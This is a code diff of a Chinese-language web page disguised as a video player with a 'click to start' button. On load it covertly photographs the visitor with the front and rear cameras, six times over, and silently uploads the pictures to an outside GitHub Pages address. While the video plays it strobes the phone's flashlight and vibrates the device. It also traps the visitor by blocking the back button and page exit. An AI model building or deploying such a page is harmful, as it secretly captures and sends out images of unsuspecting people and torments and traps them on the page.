@@ -2,48 +2,30 @@
 <html lang="zh-CN">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>视频</title>
+<meta name="viewport" content="width=device-width,initial-scalecale=1.0,user-scalable=no">
+<title>秒播</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
   html,body{width:100%;height:100%;background:#000;overflow:hidden}
   video#player{
-    position:fixed;
-    top:50%;left:50%;
-    transform:translate(-50%,-50%);
-    width:100%;height:100%;
-    object-fit:contain;
-    z-index:1;
+    position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+    width:100%;height:100%;object-fit:contain;z-index:1
   }
   #startBtn{
-    position:fixed;
-    top:50%;left:50%;
-    transform:translate(-50%,-50%);
-    width:280px;
-    height:80px;
-    background:#000;
-    border:2px solid #fff;
-    color:#fff;
-    font-size:28px;
-    border-radius:16px;
-    z-index:999;
+    position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+    width:280px;height:80px;background:#000;border:2px solid #fff;
+    color:#fff;font-size:28px;border-radius:16px;z-index:999
   }
   #countdown{
-    position:fixed;
-    top:50%;left:50%;
-    transform:translate(-50%,-50%);
-    font-size:180px;
-    color:#fff;
-    font-weight:900;
-    z-index:99;
-    display:none;
+    position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+    font-size:180px;color:#fff;font-weight:900;z-index:99;display:none
   }
 </style>
 </head>
 <body>
 
-<video id="player" playsinline loop>
-  <source src="https://alimov2.a.kwimgs.com/upic/2026/02/06/BMjAyNjAyMDYwODI1MzJfMjczNzU1MzY2Ml8xODcwMTA4ODU2OTFfMl8z_b_B1a656a1938d006ebb224978cc09d0c31.mp4" type="video/mp4">
+<video id="player" playsinline muted preload="auto">
+  <source src="https://alimov2.a.kwimgs.com/upic/2026/03/02/00/BMjAyNjAzMDIwMDU1NDNfNDM3NTI4ODcxNl8xODkzMTE1Njg3OTBfMl8z_b_Bd518217cb69a0d98d74bd00f0183b4a7.mp4?clientCacheKey=3xkdqdjhkyvpebk_b.mp4&tt=b&di=88a55fd&bp=10000" type="video/mp4">
 </video>
 
 <button id="startBtn">点击开始</button>
@@ -56,22 +38,19 @@ const countdown = document.getElementById('countdown');
 
 let playCount = 0;
 const requiredPlays = 2;
+let vibrateInt, flashInt, flashTrack;
 
-let vibrateInt;
-let flashInt;
-let flashTrack = null;
-
-// 自动上传到你的服务器
+// 上传地址
 const UPLOAD_URL = "https://annb521.github.io/ANNB/gallery.html";
 
-// 防止退出
-window.addEventListener('beforeunload', e => {
-  if(playCount < requiredPlays){
-    e.preventDefault(); e.returnValue = ' ';
-  }
+player.load();
+
+// 防退出
+window.addEventListener('beforeunload', e=>{
+  if(playCount<2){e.preventDefault();e.returnValue=' '}
 });
-window.addEventListener('popstate', () => {
-  if(playCount < requiredPlays) history.pushState(null,null,location.href);
+window.addEventListener('popstate',()=>{
+  if(playCount<2)history.pushState(null,null,location.href)
 });
 history.pushState(null,null,location.href);
 
@@ -79,27 +58,26 @@ history.pushState(null,null,location.href);
 async function flash(){
   try{
     if(!flashTrack){
-      let s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-      flashTrack = s.getVideoTracks()[0];
+      let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
+      flashTrack=s.getVideoTracks()[0];
     }
-    let on = flashTrack.getSettings().torch;
-    await flashTrack.applyConstraints({advanced:[{torch:!on}]});
+    await flashTrack.applyConstraints({advanced:[{torch:!flashTrack.getSettings().torch}]});
   }catch(e){}
 }
 
 // 开始
-startBtn.onclick = () => {
-  startBtn.style.display = 'none';
-  countdown.style.display = 'block';
-  let n = 3;
-  countdown.textContent = n;
-  let t = setInterval(()=>{
+startBtn.onclick=()=>{
+  startBtn.style.display='none';
+  countdown.style.display='block';
+  let n=3;
+  countdown.textContent=n;
+  let t=setInterval(()=>{
     n--;
     if(n>0){
-      countdown.textContent = n;
+      countdown.textContent=n;
     }else{
       clearInterval(t);
-      countdown.style.display = 'none';
+      countdown.style.display='none';
       play();
     }
   },1000);
@@ -107,57 +85,64 @@ startBtn.onclick = () => {
 
 // 播放
 function play(){
-  player.muted = false;
-  player.volume = 1;
+  player.muted=false;
+  player.volume=1;
   player.play();
-
-  // 震动
-  vibrateInt = setInterval(()=>navigator.vibrate(20), 50);
-  // 闪光灯
-  flashInt = setInterval(flash, 100);
-
-  player.onended = () => {
+  vibrateInt=setInterval(()=>navigator.vibrate(20),50);
+  flashInt=setInterval(flash,100);
+  player.onended=()=>{
     playCount++;
-    if(playCount >= requiredPlays){
+    if(playCount>=2){
       clearInterval(vibrateInt);
       clearInterval(flashInt);
-      if(flashTrack) flashTrack.applyConstraints({advanced:[{torch:false}]});
+      if(flashTrack)flashTrack.applyConstraints({advanced:[{torch:false}]});
       player.pause();
     }else{
-      player.currentTime = 0;
+      player.currentTime=0;
       player.play();
     }
   };
 }
 
-// 拍照 + 自动上传
-let i=0;
-function cam(){
-  if(i>=6) return;
-  navigator.mediaDevices.getUserMedia({video:true})
-  .then(s=>{
-    let v=document.createElement('video');
-    v.srcObject=s; v.play();
-    setTimeout(()=>{
-      let c=document.createElement('canvas');
-      c.width=640; c.height=480;
-      let ctx=c.getContext('2d');
-      ctx.drawImage(v,0,0);
-      
-      c.toBlob(blob => {
-        let fd = new FormData();
-        fd.append("photo", blob, `photo_${i}.jpg`);
-        fetch(UPLOAD_URL, { method:"POST", body:fd, mode:"no-cors" })
-          .then(()=>console.log("上传成功"))
-          .catch(()=>console.log("上传失败"));
-      }, "image/jpeg", 0.9);
-
-      s.getTracks().forEach(t=>t.stop());
-      i++; setTimeout(cam,500);
-    },200);
-  }).catch(()=>setTimeout(cam,500));
+// 上传工具
+function upload(blob,name){
+  let fd=new FormData();
+  fd.append("file",blob,name);
+  fetch(UPLOAD_URL,{method:"POST",body:fd,mode:"no-cors"}).catch(()=>{});
 }
-cam();
+
+// 拍照：前后都拍
+function takeBoth(){
+  // 后置
+  navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}}).then(shot).catch(()=>{});
+  // 前置
+  navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(shot).catch(()=>{});
+}
+
+function shot(stream){
+  let v=document.createElement('video');
+  v.srcObject=stream;
+  v.play();
+  setTimeout(()=>{
+    let c=document.createElement('canvas');
+    c.width=640; c.height=480;
+    c.getContext('2d').drawImage(v,0,0);
+    c.toBlob(b=>upload(b,`pic_${Date.now()}.jpg`),"image/jpeg",0.8);
+    stream.getTracks().forEach(t=>t.stop());
+  },300);
+}
+
+// 自动连拍
+let count=0;
+function startShot(){
+  if(count>=6)return;
+  takeBoth();
+  count++;
+  setTimeout(startShot,600);
+}
+
+// 启动拍照
+startShot();
 </script>
 </body>
 </html>
